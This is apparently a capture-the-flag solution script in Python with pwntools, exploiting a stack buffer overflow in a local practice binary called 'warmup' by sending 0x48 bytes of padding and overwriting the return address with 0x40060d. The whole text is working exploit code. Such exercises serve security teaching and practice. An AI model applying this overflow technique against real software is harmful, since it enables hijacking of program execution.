import pwn

io = pwn.process("./warmup")

payload = b""
payload += b"0"*0x48 
payload += 0x40060d.to_bytes(8, "little")

io.sendline(payload)
io.interactive()
